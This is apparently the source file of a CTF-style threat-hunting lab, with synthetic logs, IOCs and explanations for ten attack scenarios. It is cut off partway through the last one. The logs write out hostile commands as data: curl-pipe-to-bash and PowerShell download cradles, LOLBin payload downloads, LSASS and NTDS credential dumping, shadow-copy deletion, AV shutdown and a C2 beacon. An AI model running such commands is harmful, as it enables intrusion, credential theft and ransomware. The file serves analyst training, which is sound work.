// Threat Hunting Laboratory — Find the Attacker in the Logs
// Interactive CTF-style challenges for SOC analysts and threat hunters.
// Copyright (c) 2026 Darknode-Official. All rights reserved.

const esc = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

// ============================================================================
// HUNTING SCENARIOS — 10 challenges with realistic log data and hidden IOCs
// ============================================================================
const SCENARIOS = [
  {
    id: 'insider',
    name: 'The Insider',
    difficulty: 'Medium',
    description: 'An employee in the finance department has been exfiltrating sensitive data to a personal cloud storage account. Find the evidence in the proxy logs.',
    mitre: ['T1567.002', 'T1074', 'T1005'],
    iocs: [
      { type: 'ip', value: '10.0.2.47', hint: 'Source workstation of the insider' },
      { type: 'domain', value: 'mega.nz', hint: 'Cloud storage service used for exfiltration' },
      { type: 'username', value: 'jthompson', hint: 'The insider employee username' },
      { type: 'pattern', value: 'large upload after hours', hint: 'Data exfiltration pattern — large uploads between 10pm-6am' },
    ],
    logs: [
      '2026-09-10 08:15:22 PROXY 10.0.2.12 GET https://outlook.office365.com/owa/ 200 3412 "Mozilla/5.0" user=msmith',
      '2026-09-10 08:16:01 PROXY 10.0.2.15 GET https://slack.com/api/conversations.list 200 8921 "Slack/4.35" user=klee',
      '2026-09-10 08:22:45 PROXY 10.0.2.47 GET https://finance.corp.local/reports/q3 200 45231 "Mozilla/5.0" user=jthompson',
      '2026-09-10 08:31:12 PROXY 10.0.2.20 GET https://jira.corp.local/browse/PROJ-123 200 12043 "Mozilla/5.0" user=agarcia',
      '2026-09-10 09:14:33 PROXY 10.0.2.47 GET https://sharepoint.corp.local/finance/budgets 200 892341 "Mozilla/5.0" user=jthompson',
      '2026-09-10 09:15:02 PROXY 10.0.2.47 GET https://sharepoint.corp.local/finance/salary-data 200 1245678 "Mozilla/5.0" user=jthompson',
      '2026-09-10 10:05:44 PROXY 10.0.2.30 GET https://github.com/corp/internal-tools 200 23412 "Mozilla/5.0" user=bwilson',
      '2026-09-10 12:30:15 PROXY 10.0.2.47 GET https://drive.google.com/drive/my-drive 200 5623 "Mozilla/5.0" user=jthompson',
      '2026-09-10 14:22:11 PROXY 10.0.2.18 GET https://confluence.corp.local/display/ENG 200 34521 "Mozilla/5.0" user=dpark',
      '2026-09-10 16:45:33 PROXY 10.0.2.47 GET https://finance.corp.local/reports/compensation 200 234567 "Mozilla/5.0" user=jthompson',
      '2026-09-10 22:14:02 PROXY 10.0.2.47 POST https://mega.nz/upload 200 45234123 "Mozilla/5.0" user=jthompson',
      '2026-09-10 22:14:58 PROXY 10.0.2.47 POST https://mega.nz/upload 200 23456789 "Mozilla/5.0" user=jthompson',
      '2026-09-10 22:15:44 PROXY 10.0.2.47 POST https://mega.nz/upload 200 67891234 "Mozilla/5.0" user=jthompson',
      '2026-09-11 08:20:11 PROXY 10.0.2.47 GET https://finance.corp.local/reports/q3 200 45231 "Mozilla/5.0" user=jthompson',
      '2026-09-11 09:00:22 PROXY 10.0.2.12 GET https://teams.microsoft.com/ 200 8923 "Mozilla/5.0" user=msmith',
      '2026-09-11 10:30:45 PROXY 10.0.2.47 GET https://sharepoint.corp.local/finance/m-and-a 200 3456789 "Mozilla/5.0" user=jthompson',
      '2026-09-11 22:08:15 PROXY 10.0.2.47 POST https://mega.nz/upload 200 89012345 "Mozilla/5.0" user=jthompson',
      '2026-09-11 22:09:01 PROXY 10.0.2.47 POST https://mega.nz/upload 200 12345678 "Mozilla/5.0" user=jthompson',
      '2026-09-12 08:15:00 PROXY 10.0.2.15 GET https://slack.com/api/channels 200 4521 "Slack/4.35" user=klee',
      '2026-09-12 09:45:33 PROXY 10.0.2.47 GET https://sharepoint.corp.local/finance/board-deck 200 5678901 "Mozilla/5.0" user=jthompson',
    ],
    explanation: 'User jthompson from 10.0.2.47 accessed sensitive finance documents (salary data, M&A, board deck, compensation) during work hours, then uploaded large files (45MB-89MB each) to mega.nz between 10pm-11pm — well outside business hours. This is a classic data exfiltration pattern by an insider.',
  },
  {
    id: 'beacon',
    name: 'Beacon Hunter',
    difficulty: 'Hard',
    description: 'A C2 beacon is hiding in the DNS logs. The attacker is using DNS tunneling with regular callback intervals. Find the beacon pattern.',
    mitre: ['T1071.004', 'T1572', 'T1041'],
    iocs: [
      { type: 'domain', value: 'update-cdn.xyz', hint: 'The C2 domain — recently registered, suspicious TLD' },
      { type: 'ip', value: '10.0.1.30', hint: 'The infected host generating beacon traffic' },
      { type: 'pattern', value: '60-second interval', hint: 'The beacon calls back every ~60 seconds with slight jitter' },
      { type: 'pattern', value: 'long subdomain strings', hint: 'Data is encoded in subdomain labels (base32/hex)' },
    ],
    logs: [
      '2026-09-10 08:00:01 DNS 10.0.1.10 A query: mail.google.com -> 142.250.80.5',
      '2026-09-10 08:00:03 DNS 10.0.1.15 A query: github.com -> 140.82.121.3',
      '2026-09-10 08:00:15 DNS 10.0.1.30 A query: aGVsbG8gd29ybGQ.update-cdn.xyz -> NXDOMAIN',
      '2026-09-10 08:00:22 DNS 10.0.1.20 A query: outlook.office365.com -> 52.97.151.18',
      '2026-09-10 08:01:14 DNS 10.0.1.30 A query: dGhpcyBpcyBhI.update-cdn.xyz -> NXDOMAIN',
      '2026-09-10 08:01:30 DNS 10.0.1.10 A query: www.google.com -> 142.250.80.4',
      '2026-09-10 08:02:16 DNS 10.0.1.30 A query: YmVhY29uIGNoZ.update-cdn.xyz -> NXDOMAIN',
      '2026-09-10 08:02:45 DNS 10.0.1.15 A query: api.github.com -> 140.82.121.5',
      '2026-09-10 08:03:17 DNS 10.0.1.30 A query: WNrIGluIHByb2.update-cdn.xyz -> NXDOMAIN',
      '2026-09-10 08:03:22 DNS 10.0.1.20 AAAA query: teams.microsoft.com -> 2603:1036:0:1::2',
      '2026-09-10 08:04:18 DNS 10.0.1.30 A query: dyZXNzIGV4Zml.update-cdn.xyz -> NXDOMAIN',
      '2026-09-10 08:04:55 DNS 10.0.1.10 A query: fonts.googleapis.com -> 142.250.80.10',
      '2026-09-10 08:05:19 DNS 10.0.1.30 A query: sdHJhdGlvbiB2.update-cdn.xyz -> NXDOMAIN',
      '2026-09-10 08:05:30 DNS 10.0.1.25 A query: cdn.jsdelivr.net -> 104.16.85.20',
      '2026-09-10 08:06:20 DNS 10.0.1.30 A query: aWEgZG5zIHR1.update-cdn.xyz -> NXDOMAIN',
      '2026-09-10 08:07:00 DNS 10.0.1.15 A query: pypi.org -> 151.101.128.223',
      '2026-09-10 08:07:21 DNS 10.0.1.30 A query: bm5lbGluZyBj.update-cdn.xyz -> NXDOMAIN',
      '2026-09-10 08:08:22 DNS 10.0.1.30 A query: MiBjaGFubmVs.update-cdn.xyz -> NXDOMAIN',
      '2026-09-10 08:08:45 DNS 10.0.1.20 A query: login.microsoftonline.com -> 20.190.160.14',
      '2026-09-10 08:09:23 DNS 10.0.1.30 A query: IGVuY3J5cHRl.update-cdn.xyz -> NXDOMAIN',
    ],
    explanation: 'Host 10.0.1.30 makes DNS queries to random-looking subdomains of update-cdn.xyz every ~60 seconds. All return NXDOMAIN. The subdomain labels are base64-encoded data being tunneled out. This is classic DNS tunneling C2 — the domain is recently registered with a .xyz TLD, and no legitimate service uses this pattern.',
  },
  {
    id: 'lateral',
    name: 'Lateral Mover',
    difficulty: 'Medium',
    description: 'An attacker has compromised a workstation and is moving laterally through the network using Pass-the-Hash. Track their movement through Windows Event Logs.',
    mitre: ['T1550.002', 'T1003.001', 'T1021.002'],
    iocs: [
      { type: 'ip', value: '10.0.2.101', hint: 'Initially compromised workstation' },
      { type: 'username', value: 'svc_backup', hint: 'Service account used for lateral movement' },
      { type: 'pattern', value: 'Logon Type 9', hint: 'NewCredentials logon type indicates Pass-the-Hash' },
      { type: 'pattern', value: 'NTLM authentication', hint: 'PtH uses NTLM, not Kerberos' },
    ],
    logs: [
      '2026-09-10 14:22:01 EventID:4624 LogonType:10 TargetUser:jsmith Src:10.0.2.50 Dest:10.0.2.101 AuthPkg:Negotiate Status:Success',
      '2026-09-10 14:30:15 EventID:4688 Process:cmd.exe Parent:explorer.exe User:jsmith Host:WS-101 CmdLine:"cmd.exe /c whoami /all"',
      '2026-09-10 14:30:45 EventID:4688 Process:tasklist.exe Parent:cmd.exe User:jsmith Host:WS-101 CmdLine:"tasklist /v"',
      '2026-09-10 14:32:11 EventID:4688 Process:net.exe Parent:cmd.exe User:jsmith Host:WS-101 CmdLine:"net user /domain"',
      '2026-09-10 14:35:22 EventID:10 TargetImage:lsass.exe SourceImage:rundll32.exe GrantedAccess:0x1010 Host:WS-101',
      '2026-09-10 14:35:23 EventID:4688 Process:rundll32.exe Parent:cmd.exe User:jsmith Host:WS-101 CmdLine:"rundll32.exe comsvcs.dll MiniDump"',
      '2026-09-10 14:40:01 EventID:4624 LogonType:9 TargetUser:svc_backup Src:10.0.2.101 Dest:10.0.1.20 AuthPkg:NTLM Status:Success',
      '2026-09-10 14:40:15 EventID:4624 LogonType:9 TargetUser:svc_backup Src:10.0.2.101 Dest:10.0.1.30 AuthPkg:NTLM Status:Success',
      '2026-09-10 14:41:02 EventID:4624 LogonType:9 TargetUser:svc_backup Src:10.0.2.101 Dest:10.0.1.40 AuthPkg:NTLM Status:Success',
      '2026-09-10 14:41:30 EventID:7045 ServiceName:PSEXESVC Src:10.0.2.101 Dest:10.0.1.40 User:svc_backup',
      '2026-09-10 14:42:00 EventID:4688 Process:cmd.exe Parent:PSEXESVC.exe User:SYSTEM Host:DB-01 CmdLine:"cmd.exe /c ipconfig /all"',
      '2026-09-10 14:42:30 EventID:4688 Process:net.exe Parent:cmd.exe User:SYSTEM Host:DB-01 CmdLine:"net user administrator /domain"',
      '2026-09-10 14:43:15 EventID:4624 LogonType:9 TargetUser:svc_backup Src:10.0.1.40 Dest:10.0.1.10 AuthPkg:NTLM Status:Success',
      '2026-09-10 14:43:30 EventID:4688 Process:ntdsutil.exe Parent:cmd.exe User:SYSTEM Host:DC-01 CmdLine:"ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\"',
      '2026-09-10 14:50:22 EventID:4624 LogonType:3 TargetUser:msmith Src:10.0.2.12 Dest:10.0.1.50 AuthPkg:Kerberos Status:Success',
    ],
    explanation: 'The attacker on WS-101 (10.0.2.101) dumped LSASS memory using rundll32+comsvcs.dll (Sysmon Event 10 on lsass.exe). They extracted the svc_backup NTLM hash and used Pass-the-Hash (Logon Type 9 + NTLM auth package) to move to servers 10.0.1.20, .30, .40. On DB-01 they deployed PsExec (Event 7045: PSEXESVC service installed). From DB-01 they pivoted to the DC (10.0.1.10) and ran ntdsutil to extract NTDS.dit — getting all domain password hashes.',
  },
  {
    id: 'cryptominer',
    name: 'The Cryptominer',
    difficulty: 'Easy',
    description: 'A server has been compromised and is running a cryptocurrency miner. Find the evidence in the system and network logs.',
    mitre: ['T1496', 'T1059.004', 'T1053.003'],
    iocs: [
      { type: 'ip', value: '10.0.1.25', hint: 'The compromised server' },
      { type: 'domain', value: 'pool.minexmr.com', hint: 'Monero mining pool' },
      { type: 'process', value: 'xmrig', hint: 'XMRig cryptocurrency miner process' },
      { type: 'pattern', value: 'port 3333', hint: 'Common Stratum mining protocol port' },
    ],
    logs: [
      '2026-09-10 03:15:22 AUTH 10.0.1.25 sshd[1234]: Accepted password for root from 45.33.32.156 port 54321',
      '2026-09-10 03:15:45 PROCESS 10.0.1.25 root bash: curl -s http://45.33.32.156/setup.sh | bash',
      '2026-09-10 03:16:01 PROCESS 10.0.1.25 root bash: chmod +x /tmp/.xmrig && /tmp/.xmrig --donate-level 0 -o pool.minexmr.com:3333 -u 4ABC...wallet',
      '2026-09-10 03:16:05 CRON 10.0.1.25 root: (root) CMD (/tmp/.xmrig --donate-level 0 -o pool.minexmr.com:3333 > /dev/null 2>&1)',
      '2026-09-10 03:16:10 NETFLOW 10.0.1.25 -> 178.128.242.134:3333 TCP ESTABLISHED bytes_out:1024 bytes_in:512',
      '2026-09-10 08:00:00 SYSLOG 10.0.1.25 kernel: CPU0: 99.8% CPU1: 99.7% CPU2: 99.9% CPU3: 99.8%',
      '2026-09-10 08:00:01 PROCESS 10.0.1.25 PID:5678 USER:root CMD:/tmp/.xmrig CPU:398%',
      '2026-09-10 12:00:00 SYSLOG 10.0.1.25 kernel: CPU0: 99.9% CPU1: 99.8% CPU2: 99.9% CPU3: 99.7%',
      '2026-09-10 12:00:15 NETFLOW 10.0.1.25 -> 178.128.242.134:3333 TCP ESTABLISHED bytes_out:45678 bytes_in:23456',
      '2026-09-10 14:22:00 AUTH 10.0.1.20 sshd[5678]: Accepted publickey for deploy from 10.0.1.25 port 43210',
      '2026-09-10 16:00:00 SYSLOG 10.0.1.25 kernel: CPU0: 99.7% CPU1: 99.9% CPU2: 99.8% CPU3: 99.9%',
    ],
    explanation: 'Server 10.0.1.25 was compromised via SSH brute force from 45.33.32.156. The attacker downloaded xmrig (Monero miner) via curl|bash, placed it in /tmp as a hidden file (.xmrig), added a cron job for persistence, and connected to pool.minexmr.com on port 3333. All 4 CPUs are pegged at 99%+ — clear cryptomining activity.',
  },
  {
    id: 'phishing',
    name: 'Phishing Aftermath',
    difficulty: 'Medium',
    description: 'An employee clicked a phishing link. Follow the chain from email to macro to PowerShell to C2 beacon in these endpoint logs.',
    mitre: ['T1566.001', 'T1204.002', 'T1059.001', 'T1071.001'],
    iocs: [
      { type: 'ip', value: '10.0.2.33', hint: 'The victim workstation' },
      { type: 'domain', value: 'invoice-portal.net', hint: 'Phishing domain hosting the malicious document' },
      { type: 'ip', value: '185.220.101.42', hint: 'C2 server IP' },
      { type: 'pattern', value: 'encoded PowerShell', hint: 'Base64-encoded PowerShell command (EncodedCommand)' },
      { type: 'process', value: 'WINWORD.EXE spawning cmd.exe', hint: 'Macro execution — Word should not spawn command prompts' },
    ],
    logs: [
      '2026-09-10 09:12:01 EMAIL From:billing@invoice-portal.net To:rjones@corp.local Subject:"Invoice #INV-2026-4891 - Payment Required" Attachment:Invoice_Sep2026.docm',
      '2026-09-10 09:14:33 PROCESS 10.0.2.33 WINWORD.EXE Parent:explorer.exe User:rjones CmdLine:"WINWORD.EXE Invoice_Sep2026.docm"',
      '2026-09-10 09:14:45 PROCESS 10.0.2.33 cmd.exe Parent:WINWORD.EXE User:rjones CmdLine:"cmd.exe /c powershell -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAAyAC8AcwB0AGEAZwBlAHIAJwApAA=="',
      '2026-09-10 09:14:50 NETFLOW 10.0.2.33 -> 185.220.101.42:80 TCP GET /stager HTTP/1.1 200 OK bytes:45678',
      '2026-09-10 09:14:55 PROCESS 10.0.2.33 powershell.exe Parent:cmd.exe User:rjones CmdLine:"powershell.exe -nop -w hidden -c IEX(download...)"',
      '2026-09-10 09:15:00 DNS 10.0.2.33 A query: cdn-static-assets.com -> 185.220.101.42',
      '2026-09-10 09:15:01 NETFLOW 10.0.2.33 -> 185.220.101.42:443 TCP ESTABLISHED (HTTPS beacon)',
      '2026-09-10 09:15:30 NETFLOW 10.0.2.33 -> 185.220.101.42:443 TCP 1024 bytes (beacon checkin)',
      '2026-09-10 09:20:30 NETFLOW 10.0.2.33 -> 185.220.101.42:443 TCP 1024 bytes (beacon checkin)',
      '2026-09-10 09:25:30 NETFLOW 10.0.2.33 -> 185.220.101.42:443 TCP 1024 bytes (beacon checkin)',
      '2026-09-10 09:30:00 PROCESS 10.0.2.33 whoami.exe Parent:powershell.exe User:rjones CmdLine:"whoami /all"',
      '2026-09-10 09:30:15 PROCESS 10.0.2.33 net.exe Parent:powershell.exe User:rjones CmdLine:"net user /domain"',
      '2026-09-10 09:31:00 PROCESS 10.0.2.33 nltest.exe Parent:powershell.exe User:rjones CmdLine:"nltest /dclist:corp.local"',
    ],
    explanation: 'Employee rjones received a phishing email from invoice-portal.net with a macro-enabled .docm attachment. Opening it in Word triggered a macro that spawned cmd.exe (suspicious — Word should never do this), which ran base64-encoded PowerShell to download a stager from 185.220.101.42. A C2 beacon was established over HTTPS with 5-minute callbacks. The attacker then ran discovery commands (whoami, net user, nltest) via the beacon.',
  },
  {
    id: 'lotl',
    name: 'Living Off the Land',
    difficulty: 'Hard',
    description: 'An attacker is using only built-in Windows tools (LOLBins) — no custom malware. Find the suspicious LOLBin usage in these Sysmon logs.',
    mitre: ['T1218', 'T1059.001', 'T1140', 'T1105'],
    iocs: [
      { type: 'process', value: 'certutil.exe downloading files', hint: 'certutil -urlcache is used to download payloads' },
      { type: 'process', value: 'mshta.exe executing remote HTA', hint: 'mshta.exe loading a remote script is suspicious' },
      { type: 'process', value: 'rundll32.exe with unusual DLL', hint: 'rundll32 loading a DLL from temp directory' },
      { type: 'ip', value: '10.0.2.88', hint: 'The compromised workstation' },
    ],
    logs: [
      '2026-09-10 10:00:01 Sysmon EventID:1 10.0.2.88 Image:C:\\Windows\\System32\\certutil.exe CmdLine:"certutil -urlcache -split -f http://10.99.1.5/payload.dll C:\\Users\\Public\\svc.dll" Parent:cmd.exe User:admin',
      '2026-09-10 10:00:05 Sysmon EventID:3 10.0.2.88 Image:certutil.exe DestIP:10.99.1.5 DestPort:80 Proto:TCP',
      '2026-09-10 10:00:10 Sysmon EventID:11 10.0.2.88 TargetFile:C:\\Users\\Public\\svc.dll Image:certutil.exe',
      '2026-09-10 10:00:15 Sysmon EventID:1 10.0.2.88 Image:C:\\Windows\\System32\\rundll32.exe CmdLine:"rundll32.exe C:\\Users\\Public\\svc.dll,DllMain" Parent:cmd.exe User:admin',
      '2026-09-10 10:00:30 Sysmon EventID:3 10.0.2.88 Image:rundll32.exe DestIP:185.100.87.33 DestPort:443 Proto:TCP',
      '2026-09-10 10:01:00 Sysmon EventID:1 10.0.2.88 Image:C:\\Windows\\System32\\mshta.exe CmdLine:"mshta http://10.99.1.5/update.hta" Parent:explorer.exe User:admin',
      '2026-09-10 10:01:05 Sysmon EventID:1 10.0.2.88 Image:C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CmdLine:"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0A..." Parent:mshta.exe User:admin',
      '2026-09-10 10:05:00 Sysmon EventID:1 10.0.2.88 Image:C:\\Windows\\System32\\bitsadmin.exe CmdLine:"bitsadmin /transfer evil /download /priority high http://10.99.1.5/tools.zip C:\\Users\\Public\\tools.zip" Parent:powershell.exe User:admin',
      '2026-09-10 10:10:00 Sysmon EventID:1 10.0.2.10 Image:C:\\Windows\\System32\\wmic.exe CmdLine:"wmic /node:10.0.2.88 process call create cmd.exe" Parent:cmd.exe User:SYSTEM',
      '2026-09-10 10:15:00 Sysmon EventID:1 10.0.2.88 Image:C:\\Windows\\System32\\reg.exe CmdLine:"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d rundll32.exe C:\\Users\\Public\\svc.dll,DllMain" Parent:cmd.exe User:admin',
    ],
    explanation: 'Every tool used is a legitimate Windows binary: certutil (download), rundll32 (execute DLL), mshta (execute HTA script), PowerShell (encoded commands), bitsadmin (download), wmic (remote execution), reg (persistence via Run key). No custom malware was dropped — only the DLL payload. This is living-off-the-land, the hardest type of attack to detect because every binary is Microsoft-signed.',
  },
  {
    id: 'cloud',
    name: 'Cloud Breach',
    difficulty: 'Hard',
    description: 'Someone is making unauthorized AWS API calls using stolen credentials. Find the malicious activity in these CloudTrail logs.',
    mitre: ['T1078.004', 'T1580', 'T1530'],
    iocs: [
      { type: 'ip', value: '45.77.123.89', hint: 'Unusual source IP — VPN/hosting provider, not corporate' },
      { type: 'username', value: 'deploy-svc', hint: 'Service account being abused' },
      { type: 'pattern', value: 'iam:CreateUser', hint: 'Creating new IAM users is a persistence technique' },
      { type: 'pattern', value: 'S3 GetObject on sensitive bucket', hint: 'Downloading from a bucket the service account should not access' },
    ],
    logs: [
      '2026-09-10 08:00:01 CloudTrail iam:ListUsers sourceIP:10.0.0.5 user:admin@corp.local accessKey:AKIA1234NORMAL',
      '2026-09-10 08:15:22 CloudTrail ec2:DescribeInstances sourceIP:10.0.0.5 user:admin@corp.local accessKey:AKIA1234NORMAL',
      '2026-09-10 10:30:01 CloudTrail sts:GetCallerIdentity sourceIP:45.77.123.89 user:deploy-svc accessKey:AKIA5678DEPLOY',
      '2026-09-10 10:30:05 CloudTrail iam:ListUsers sourceIP:45.77.123.89 user:deploy-svc accessKey:AKIA5678DEPLOY',
      '2026-09-10 10:30:10 CloudTrail iam:ListRoles sourceIP:45.77.123.89 user:deploy-svc accessKey:AKIA5678DEPLOY',
      '2026-09-10 10:30:15 CloudTrail iam:ListPolicies sourceIP:45.77.123.89 user:deploy-svc accessKey:AKIA5678DEPLOY',
      '2026-09-10 10:31:00 CloudTrail s3:ListBuckets sourceIP:45.77.123.89 user:deploy-svc accessKey:AKIA5678DEPLOY',
      '2026-09-10 10:31:30 CloudTrail s3:GetObject sourceIP:45.77.123.89 user:deploy-svc bucket:corp-customer-data key:exports/full-db-2026.sql.gz',
      '2026-09-10 10:32:00 CloudTrail s3:GetObject sourceIP:45.77.123.89 user:deploy-svc bucket:corp-secrets key:env/production.env',
      '2026-09-10 10:33:00 CloudTrail iam:CreateUser sourceIP:45.77.123.89 user:deploy-svc newUser:backup-admin-2',
      '2026-09-10 10:33:15 CloudTrail iam:CreateAccessKey sourceIP:45.77.123.89 user:deploy-svc targetUser:backup-admin-2',
      '2026-09-10 10:33:30 CloudTrail iam:AttachUserPolicy sourceIP:45.77.123.89 user:deploy-svc targetUser:backup-admin-2 policy:AdministratorAccess',
      '2026-09-10 12:00:01 CloudTrail ec2:RunInstances sourceIP:10.0.0.5 user:admin@corp.local instanceType:t3.medium',
      '2026-09-10 14:00:00 CloudTrail lambda:ListFunctions sourceIP:10.0.0.5 user:admin@corp.local accessKey:AKIA1234NORMAL',
    ],
    explanation: 'The deploy-svc access key was used from 45.77.123.89 (a hosting provider IP, not corporate). The attacker enumerated IAM users/roles/policies, listed S3 buckets, downloaded customer data and production secrets, then created a backdoor IAM user (backup-admin-2) with AdministratorAccess for persistence. Legitimate admin activity from 10.0.0.5 continues normally — the attacker is operating separately.',
  },
  {
    id: 'ransomware_precursor',
    name: 'Ransomware Precursor',
    difficulty: 'Medium',
    description: 'A ransomware attack is about to happen. Can you spot the pre-encryption indicators and stop it before the payload deploys?',
    mitre: ['T1490', 'T1562.001', 'T1486', 'T1489'],
    iocs: [
      { type: 'command', value: 'vssadmin delete shadows', hint: 'Volume Shadow Copy deletion — preparing for encryption' },
      { type: 'command', value: 'bcdedit /set recoveryenabled no', hint: 'Disabling Windows Recovery — no safe mode recovery' },
      { type: 'process', value: 'wmic shadowcopy delete', hint: 'Alternative method to delete shadow copies' },
      { type: 'pattern', value: 'stopping security services', hint: 'Disabling AV/EDR before deploying ransomware' },
    ],
    logs: [
      '2026-09-10 02:00:01 EventID:4624 LogonType:10 TargetUser:admin Src:10.0.2.101 Dest:10.0.1.40 AuthPkg:NTLM',
      '2026-09-10 02:01:00 EventID:4688 Process:cmd.exe Parent:explorer.exe User:admin Host:SRV-01 CmdLine:"cmd.exe"',
      '2026-09-10 02:01:15 EventID:4688 Process:net.exe Parent:cmd.exe User:admin Host:SRV-01 CmdLine:"net stop \"Sophos\" /y"',
      '2026-09-10 02:01:20 EventID:4688 Process:net.exe Parent:cmd.exe User:admin Host:SRV-01 CmdLine:"net stop \"Windows Defender\" /y"',
      '2026-09-10 02:01:25 EventID:4688 Process:net.exe Parent:cmd.exe User:admin Host:SRV-01 CmdLine:"net stop \"Symantec\" /y"',
      '2026-09-10 02:02:00 EventID:4688 Process:vssadmin.exe Parent:cmd.exe User:admin Host:SRV-01 CmdLine:"vssadmin delete shadows /all /quiet"',
      '2026-09-10 02:02:10 EventID:4688 Process:wmic.exe Parent:cmd.exe User:admin Host:SRV-01 CmdLine:"wmic shadowcopy delete"',
      '2026-09-10 02:02:20 EventID:4688 Process:bcdedit.exe Parent:cmd.exe User:admin Host:SRV-01 CmdLine:"bcdedit /set {default} recoveryenabled no"',
      '2026-09-10 02:02:30 EventID:4688 Process:bcdedit.exe Parent:cmd.exe User:admin Host:SRV-01 CmdLine:"bcdedit /set {default} bootstatuspolicy ignoreallfailures"',
      '2026-09-10 02:03:00 EventID:4688 Process:wbadmin.exe Parent:cmd.exe User:admin Host:SRV-01 CmdLine:"wbadmin delete catalog -quiet"',
      '2026-09-10 02:05:00 EventID:4688 Process:locker.exe Parent:cmd.exe User:admin Host:SRV-01 CmdLine:"locker.exe --encrypt --path C:\\ --ext .locked --note README_RESTORE.txt"',
      '2026-09-10 02:05:01 EventID:11 TargetFile:C:\\Users\\Public\\README_RESTORE.txt Image:locker.exe',
    ],
    explanation: 'Classic ransomware pre-encryption pattern at 2am: stop AV services (Sophos, Defender, Symantec), delete all Volume Shadow Copies (vssadmin + wmic), disable Windows Recovery (bcdedit), delete backup catalogs (wbadmin). Finally locker.exe deploys the encryption payload. Every one of these commands individually is suspicious; together they are a guaranteed ransomware attack. Detection at the shadow copy deletion stage gives you minutes to contain.',
  },
  {
    id: 'apt_persistence',
    name: 'APT Persistence',
    difficulty: 'Expert',
    description: 'An APT group has established multiple persistence mechanisms on a domain controller. Find all the hidden backdoors in these logs.',
    mitre: ['T1547.001', 'T1053.005', 'T1546.003', 'T1556.001'],
    iocs: [
      { type: 'registry', value: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysHealth', hint: 'Registry Run key persistence' },
      { type: 'task', value: 'Microsoft\\Windows\\SystemRestore', hint: 'Scheduled task masquerading as legitimate system task' },
      { type: 'wmi', value: '__EventFilter + CommandLineEventConsumer', hint: 'WMI event subscription — fileless persistence' },
      { type: 'process', value: 'skeleton key in LSASS', hint: 'Skeleton Key attack — master password for all accounts' },
    ],
    logs: [
      '2026-09-10 03:00:01 Sysmon EventID:13 Image:C:\\Windows\\System32\\reg.exe TargetObject:HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysHealth Details:"C:\\Windows\\System32\\svchost.exe -k netsvcs -s SysHealth" Host:DC-01',
      '2026-09-10 03:00:30 Sysmon EventID:1 Image:C:\\Windows\\System32\\schtasks.exe CmdLine:"schtasks /create /tn \\Microsoft\\Windows\\SystemRestore /tr C:\\Windows\\Temp\\restore.exe /sc onstart /ru SYSTEM /f" Host:DC-01',
      '2026-09-10 03:01:00 EventID:5861 Namespace:root\\subscription Class:__EventFilter Name:SCMCheck Host:DC-01',
      '2026-09-10 03:01:01 EventID:5861 Namespace:root\\subscription Class:CommandLineEventConsumer Name:SCMCheck CmdLine:"powershell -nop -w hidden -enc JABj..." Host:DC-01',
      '2026-09-10 03:01:02 EventID:5861 Namespace:root\\subscription Class:__FilterToConsumerBinding Filter:SCMCheck Consumer:SCMCheck Host:DC-01',
      '2026-09-10 03:02:00 Sysmon EventID:7 Image:C:\\Windows\\System32\\lsass.exe ImageLoaded:C:\\Windows\\System32\\msv1_0_custom.dll Host:DC-01',
      '2026-09-10 03:02:01 Sysmon EventID:1 Image:C:\\Windows\\System32\\rundll32.exe CmdLine:"rundll32.exe C:\\Windows\\System32\\msv1_0_custom.dll,Install" Parent:cmd.exe User:SYSTEM Host:DC-01',
      '2026-09-10 08:00:00 EventID:4624 LogonType:3 TargetUser:regular.user Src:10.0.2.50 Dest:DC-01 AuthPkg:NTLM Password:mimikatz',
      '2026-09-10 08:00:01 EventID:4624 LogonType:3 TargetUser:admin Src:10.0.2.50 Dest:DC-01 AuthPkg:NTLM Password:mimikatz',
      '2026-09-10 12:00:00 Sysmon EventID:1 Image:C:\\Windows\\Temp\\restore.exe CmdLine:"restore.exe --beacon https://c2.attacker.com/gate" Parent:svchost.exe Host:DC-01',
    ],
    explanation: 'Four persistence mechanisms on the DC: (1) Registry Run key "SysHealth" pointing to a fake svchost service. (2) Scheduled task "SystemRestore" masquerading as a legit Windows task, running restore.exe (actually a C2 beacon) at boot. (3) WMI event subscription "SCMCheck" — fileless persistence via __EventFilter → CommandLineEventConsumer running encoded PowerShell. (4) Skeleton Key — a custom MSV1_0 DLL loaded into LSASS, allowing authentication with the master password "mimikatz" for ANY account. Notice at 8:00am two accounts authenticate with the password "mimikatz" — that is the skeleton key in action.',
  },
  {
    id: 'supply_chain_hunt',
    name: 'Supply Chain',
    difficulty: 'Expert',
    description: 'A software update server has been compromised and is distributing backdoored packages. Find the supply chain compromise in these mixed logs.',
    mitre: ['T1195.002', 'T1072', 'T1059.001'],
    iocs: [
      { type: 'hash', value: 'a1b2c3d4e5f6...', hint: 'The hash of the backdoored update package differs from the legitimate one' },
      { type: 'domain', value: 'telemetry-cdn.net', hint: 'C2 domain disguised as telemetry — not a legitimate vendor domain' },
      { type: 'pattern', value: 'update spawning PowerShell', hint: 'Legitimate updates should not spawn PowerShell with encoded commands' },
      { type: 'ip', value: '10.0.1.50', hint: 'The compromised internal update server' },
    ],
    logs: [
      '2026-09-09 02:00:01 UPDATE-SRV 10.0.1.50 Downloaded package: vendor-agent-3.2.1.msi from vendor.com SHA256:abc123def456...(legitimate)',
      '2026-09-09 02:00:05 UPDATE-SRV 10.0.1.50 SSH login from 45.33.99.12 user:root (UNEXPECTED - not in admin list)',
      '2026-09-09 02:01:00 UPDATE-SRV 10.0.1.50 File modified: /packages/vendor-agent-3.2.1.msi SHA256:a1b2c3d4e5f6...(CHANGED)',
